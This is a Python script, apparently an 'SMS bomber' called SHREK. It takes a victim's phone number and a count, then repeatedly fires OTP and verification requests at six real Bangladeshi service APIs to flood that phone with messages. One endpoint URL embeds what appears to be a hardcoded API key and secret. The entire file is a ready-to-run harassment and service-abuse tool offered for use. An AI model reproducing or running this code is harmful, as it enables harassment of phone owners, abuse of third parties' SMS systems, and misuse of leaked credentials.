import os

import requests

from requests.structures import CaseInsensitiveDict

import sys

import time


os.system("clear")

red="\033[0;31m"          # Red

yellow="\033[0;33m"       # Yellow

green="\033[0;32m"        # Green

color_off="\033[0m"       # Text Reset

bblack="\033[1;30m"       # Black

bred="\033[1;31m"         # Red

ured="\033[4;31m"         # Red

on_green="\033[42m"       # Green

blue="\033[0;34m"         # Blue

lightblue = '\033[94m'

red = '\033[91m'

white = '\33[97m'

yellow = '\33[93m'

green = '\033[1;32m'

cyan  = "\033[96m"

end = '\033[0m'

purple="\033[0;35m"

logo=(red+"""        ███████╗██╗  ██╗██████╗ ███████╗██╗  ██╗    
        ██╔════╝██║  ██║██╔══██╗██╔════╝██║ ██╔╝ \33[93m   
        ███████╗███████║██████╔╝█████╗  █████╔╝     
        ╚════██║██╔══██║██╔══██╗██╔══╝  ██╔═██╗     
  \33[1;32m      ███████║██║  ██║██║  ██║███████╗██║  ██╗    
        ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝    
                                                    """+end)


line=(green+"▬"*100)


 
dtls=(cyan+"\t\tDeveloped By:Shabbir Rahman")



print(logo)

print(" ")

print(dtls)

print(line)


os.system("clear")	

print(logo)

print(" ")

print(dtls)

print(line)


print(' ')

number=str(input(yellow+"\n[>] Enter The  Number : "+green))
amount=int(input(yellow+"\n[>] Enter The Amount : "+green))

url1 = "https://ss.binge.buzz/otp/send/login"

headers1 = CaseInsensitiveDict()
headers1["Content-Type"] = "application/x-www-form-urlencoded"

data1 = "phone="+number



url2 = "https://api.daktarbhai.com/api/v2/otp/generate?=&api_key=BUFWICFGGNILMSLIYUVH&api_secret=WZENOMMJPOKHYOMJSPOGZNAGMPAEZDMLNVXGMTVE&mobile=%2B88"+number+"&platform=app&activity=login"

headers2 = CaseInsensitiveDict()
headers2["Content-Type"] = "application/json"
headers2["Content-Length"] = "0"


url3 = "https://stage.bioscopelive.com/en/login/send-otp?phone=88"+number+"&operator=bd-otp"

url4 = "https://xrides.shohoz.com/api/v2/user/send-mobile-verification-code"

headers4 = CaseInsensitiveDict()
headers4["Content-Type"] = "application/json"

data4 = '{\"mobile\":\"'+number+'\"}'

url5 = "https://addabaji.mobi/twocups-v1-robi/otp.php"

headers5 = CaseInsensitiveDict()
headers5["Content-Type"] = "application/x-www-form-urlencoded"

data5 = "msisdn="+number

url6 = "https://developer.quizgiri.xyz/api/v2.0/send-otp"
headers6 = CaseInsensitiveDict()
headers6["Content-Type"] = "application/json"

data6 = '{"phone":"'+number+'","country_code":"+880","fcm_token":null}'

for i in range (amount):
	resp1 = requests.post(url1, headers=headers1, data=data1)
	resp2 = requests.post(url2, headers=headers2)
	resp3 = requests.get(url3)
	resp4 = requests.post(url4, headers=headers4,data=data4)
	resp5 = requests.post(url5, headers=headers5, data=data5)
	resp = requests.post(url6, headers=headers6, data=data6)	
	print(str(i+1)+green+' .SHREK==>  SMS Sent[✔]')

last=str(input(green+"\n\n\t\t  [✓] All Done!\n\t [•] Now Press Enter Key To Main menu \n"))
os.system("python3 main.py")


